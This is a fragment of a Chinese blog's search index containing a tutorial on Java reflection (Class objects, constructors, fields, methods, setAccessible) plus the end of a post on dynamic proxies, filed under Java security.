<p>总的来说，<code>java.lang.reflect.Proxy</code>类是通过创建一个新的<code>Java类</code>–<code>com.sun.proxy.$ProxyXXX</code>的方式来实现类方法代理功能的。</p>
<p>需要注意的是，如果动过动态代理生成了多个动态代理类，新生成的类名中的 <code>0</code> 会自增，如 <code>com.sun.proxy.$Proxy0/$Proxy1/$Proxy2</code>。</p>
]]></content>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
  <entry>
    <title>Java 反射机制</title>
    <url>/2022/05/23/%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/Java%20%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6/</url>
    <content><![CDATA[<p>Java的反射是指程序在运行期间可以拿到一个对象的所有信息，并且可以操作类或者对象的内部属性–<code>反射属于动态编译</code></p>
<span id="more"></span>
<h4 id="对类的对象的初始化"><a href="#对类的对象的初始化" class="headerlink" title="对类的对象的初始化"></a>对类的对象的初始化</h4><h5 id="一般情况下-已知类以及其的功能"><a href="#一般情况下-已知类以及其的功能" class="headerlink" title="一般情况下(已知类以及其的功能)"></a>一般情况下(已知类以及其的功能)</h5><p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210304223219980.png" alt="image-20210304184612646"></p>
<h5 id="使用反射"><a href="#使用反射" class="headerlink" title="使用反射"></a>使用反射</h5><p>一开始不知道初始化的类对象是什么，无法使用类关键字来创建对象</p>
<ol>
<li>获取反射之中的Class对象</li>
<li>通过反射创建类对象</li>
<li>通过反射获取类属性，方法，构造器</li>
</ol>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210304184612646.png" alt="image-20210304223219980"></p>
<p>eg：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ref3</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> price;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getPrice</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setPrice</span><span class="params">(<span class="type">int</span> price)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.price = price;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="comment">//获取类的Class对象</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;Reflection.ref3&quot;</span>);</span><br><span class="line">        <span class="comment">//通过Class对象实例分别获取Constructor类对象，Method类对象</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">setPrice</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;setPrice&quot;</span>, <span class="type">int</span>.class);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">appleconstructor</span> <span class="operator">=</span> cls.getConstructor();</span><br><span class="line">        <span class="comment">//使用Constructor对象的newInstance方法互殴去反射类对象</span></span><br><span class="line">        <span class="type">Object</span> <span class="variable">appleObj</span> <span class="operator">=</span> appleconstructor.newInstance();</span><br><span class="line">        <span class="comment">//利用invoke方法调用方法</span></span><br><span class="line">        setPrice.invoke(appleObj, <span class="number">12</span>);</span><br><span class="line">        <span class="comment">//根据获取的Constructor类对象，Method类对象获取类的方法</span></span><br><span class="line">        <span class="type">Method</span> <span class="variable">getPriceMethod</span> <span class="operator">=</span> cls.getMethod(<span class="string">&quot;getPrice&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="comment">//通过Class对象的getFields()方法可以获取Class类的属性</span></span><br><span class="line">        Field[] fields = cls.getFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;field&#x27;s name&quot;</span>+field.getName());</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        System.out.println(<span class="string">&quot;Apple price: &quot;</span>+getPriceMethod.invoke(appleObj));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出的结果为：</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210303223014821.png" alt="image-20210304193424835"></p>
<p>反射机制的实现主要通过操作<code>java.lang.Class类</code></p>
<ul>
<li>静态编译–在<strong>编译时</strong>确定类型并且绑定对象。比如常见的使用<code>new关键字</code>创建对象</li>
<li>动态编译–<strong>运行时</strong>确定类型并且绑定对象，它不需要实现知道对象是谁。动态编译体现了<code>Java</code>的<code>灵活性</code>，<code>多动态</code>特性以及可以<code>降低类之间的耦合性</code>，但是同时也会因此导致时间成本高于直接执行相同的操作</li>
</ul>
<h4 id="反射的主要功能"><a href="#反射的主要功能" class="headerlink" title="反射的主要功能"></a>反射的主要功能</h4><ul>
<li>在<code>运行时</code>判断任意一个对象所属的类</li>
<li>在<code>运行时</code>构造任意一个类的对象</li>
<li>在<code>运行时</code>判断任意一个类所具有的成员变量和方法</li>
<li>在<code>运行时</code>调用任意一个对象的方法</li>
</ul>
<h3 id="主要涉及的类"><a href="#主要涉及的类" class="headerlink" title="主要涉及的类"></a>主要涉及的类</h3><h4 id="java-lang-Class类"><a href="#java-lang-Class类" class="headerlink" title="java.lang.Class类"></a>java.lang.Class类</h4><p>java.lang.Class存放着对应类型对象的运行时信息</p>
<ul>
<li>在Java程序运行时，JVM为所有类型维护一个<code>java.lang.Class对象</code></li>
<li>该Class对象存放着所有关于该对象的<code>运行时信息</code></li>
<li><code>泛型形式为Class&lt;T&gt;</code></li>
<li><strong>每种类型的Class对象只有1个-&gt;地址只有一个</strong></li>
</ul>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.Class;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ref1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">        <span class="comment">//Object类中的getClass()返回一个Class类型的实例</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c1</span> <span class="operator">=</span> <span class="string">&quot;Karry&quot;</span>.getClass();</span><br><span class="line">        <span class="comment">//static method Class.forName()</span></span><br><span class="line">        <span class="type">Class</span> <span class="variable">c2</span> <span class="operator">=</span>  Class.forName(<span class="string">&quot;java.lang.String&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(c1==c2);</span><br><span class="line">        <span class="comment">//用==运算符实现两个类对象的地址的比较</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>运算结果为</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210304193424835.png" alt="image-20210303223014821"></p>
<ul>
<li>Java 反射机制的实现除了依靠<code>java.lang.Class类</code>，还需要依靠：<code>Constructor类</code>，<code>Field类</code>，<code>Method类</code></li>
</ul>
<h4 id="java-lang-reflect-Type类"><a href="#java-lang-reflect-Type类" class="headerlink" title="java.lang.reflect.Type类"></a>java.lang.reflect.Type类</h4><p>java.lang.reflect.Type类时Java中所有类型的父接口</p>
<h5 id="Type类型的子类型接口"><a href="#Type类型的子类型接口" class="headerlink" title="Type类型的子类型接口"></a>Type类型的子类型接口</h5><ul>
<li>原生类型(raw types)</li>
<li>参数化类型(parameterized typed)</li>
<li>数组类型(array types)</li>
<li>类型变量(type variables)</li>
<li>原始类类型(primitive types)</li>
</ul>
<h5 id="反射类对应类的各个组成部分"><a href="#反射类对应类的各个组成部分" class="headerlink" title="反射类对应类的各个组成部分"></a>反射类对应类的各个组成部分</h5><ul>
<li>Class类–类对象</li>
<li>Constructor类–类的构造器对象</li>
<li>Field类–类的属性对象</li>
<li>Method类–类的方法对象</li>
</ul>
<h2 id="反射的基本运用"><a href="#反射的基本运用" class="headerlink" title="反射的基本运用"></a>反射的基本运用</h2><h4 id="获得Class对象"><a href="#获得Class对象" class="headerlink" title="获得Class对象"></a>获得Class对象</h4><ol>
<li><p>使用Object类中的<code>getClass()方法</code>返回一个Class类型的实例</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">str</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;Hello&quot;</span>);</span><br><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> str.getClass();</span><br></pre></td></tr></table></figure>
</li>
<li><p>使用<code>T.class</code>语法</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> String.class</span><br></pre></td></tr></table></figure>
<p> 只适用于在编译的时候就知道操作的Class</p>
</li>
<li><p>使用Class类的<code>forName</code>静态方法</p>
<p> 知道类的全路径的情况下，可以使用这种方法获取Class对象</p>
 <figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;Java.lang.String&quot;</span>);</span><br></pre></td></tr></table></figure>
</li>
<li><p><code>TYPE语法</code></p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ref2</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> ClassNotFoundException&#123;</span><br><span class="line">        <span class="type">Boolean</span> <span class="variable">flag</span> <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">        Class&lt;?&gt; classType1 = flag.getClass();</span><br><span class="line">        System.out.println(classType1);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; classType2 = Boolean.class;</span><br><span class="line">        System.out.println(classType2);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; classType3 = Class.forName(<span class="string">&quot;java.lang.Boolean&quot;</span>);</span><br><span class="line">        <span class="comment">//使用此种方法时应该提供ClassNotFoundException异常处理器</span></span><br><span class="line">        System.out.println(classType3);</span><br><span class="line"></span><br><span class="line">        Class&lt;?&gt; classType4 = Boolean.TYPE;</span><br><span class="line">        System.out.println(classType4);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>输出结果为</p>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210306171157541.png" alt="image-20210303224644132"></p>
<h4 id="通过反射创建类对象"><a href="#通过反射创建类对象" class="headerlink" title="通过反射创建类对象"></a>通过反射创建类对象</h4><h5 id="通过class对象的newInstance-方法"><a href="#通过class对象的newInstance-方法" class="headerlink" title="通过class对象的newInstance()方法"></a>通过class对象的newInstance()方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> ref3.class;</span><br><span class="line"><span class="type">ref3</span> <span class="variable">apple</span> <span class="operator">=</span> (ref3)cls.newInstance();</span><br></pre></td></tr></table></figure>

<h5 id="通过Constructor对象的newInstance-方法"><a href="#通过Constructor对象的newInstance-方法" class="headerlink" title="通过Constructor对象的newInstance()方法"></a>通过Constructor对象的newInstance()方法</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> ref3.class;</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> cls.getConstructor();</span><br><span class="line"><span class="type">ref3</span> <span class="variable">Apple</span> <span class="operator">=</span> (Apple)constructor.newInstance();</span><br></pre></td></tr></table></figure>

<p>这两种方法的在于：</p>
<p><strong>通过Constructor对象创建类对象可以选择特定构造方法，而通过Class对象则只能使用默认的无参数构造方法</strong></p>
<hr>
<h4 id="通过反射获取类属性，方法，构造器"><a href="#通过反射获取类属性，方法，构造器" class="headerlink" title="通过反射获取类属性，方法，构造器"></a>通过反射获取类属性，方法，构造器</h4><h5 id="通过Class对象的getFields-方法获取Class类的属性"><a href="#通过Class对象的getFields-方法获取Class类的属性" class="headerlink" title="通过Class对象的getFields()方法获取Class类的属性"></a>通过Class对象的getFields()方法获取Class类的属性</h5><p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210304193037044.png" alt="image-20210304193037044"></p>
<p>需要注意的是：此种方法无法获取私有属性</p>
<h5 id="通过Class对象的getDeclaredFields-方法获取属性"><a href="#通过Class对象的getDeclaredFields-方法获取属性" class="headerlink" title="通过Class对象的getDeclaredFields()方法获取属性"></a>通过Class对象的getDeclaredFields()方法获取属性</h5><p>和前一种方法类似</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> ref3.class;</span><br><span class="line">Field[] fields = cls.getDeclaredFields();</span><br><span class="line">        <span class="keyword">for</span> (Field field : fields) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;field&#x27;s name: &quot;</span>+field.getName());</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>

<p>区别在于此种方法可以获取私有属性</p>
<h3 id="访问权限的问题"><a href="#访问权限的问题" class="headerlink" title="访问权限的问题"></a>访问权限的问题</h3><p>反射机制的默认行为受限于<code>Java</code>的访问控制。比如：无法访问(private)私有的方法，字段</p>
<p>Java的安全机制只允许查看任意对象有哪些域，而不允许它们读值，如果强制读取，会导致异常</p>
<h5 id="解决方式："><a href="#解决方式：" class="headerlink" title="解决方式："></a>解决方式：</h5><p>使用Field类，Method类以及Constructor类对象的<code>setAccessible()</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">setAccessible</span><span class="params">(<span class="type">boolean</span> flag)</span></span><br><span class="line">    <span class="comment">//为访问对象设置可访问标志</span></span><br><span class="line">    <span class="comment">//当flag=true的时候，标识屏蔽掉Java语言的访问检查，从而使得可以访问和修改对象的私有属性</span></span><br><span class="line">    <span class="type">boolean</span> <span class="title function_">isAccessible</span><span class="params">()</span></span><br><span class="line">    <span class="comment">//返回反射对象的可访问标志的值</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setAccessible</span><span class="params">(AccessibleObject[] array, <span class="type">boolean</span> flag)</span></span><br><span class="line">    <span class="comment">//设置对象数组可访问标志</span></span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Reflection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ref5</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">ref5</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">StudentClass</span> <span class="operator">=</span> ref5.class;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">Student</span> <span class="operator">=</span> StudentClass.newInstance();</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> StudentClass.getDeclaredField(<span class="string">&quot;name&quot;</span>);</span><br><span class="line"></span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line"></span><br><span class="line">        f.set(Student, <span class="string">&quot;Karry&quot;</span>);</span><br><span class="line"></span><br><span class="line">        System.out.println(f.get(Student));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://ttpfx.oss-cn-chengdu.aliyuncs.com/img/image-20210303224644132.png" alt="image-20210306171157541"></p>
]]></content>
      <tags>
        <tag>Java安全</tag>
      </tags>
  </entry>
</search>
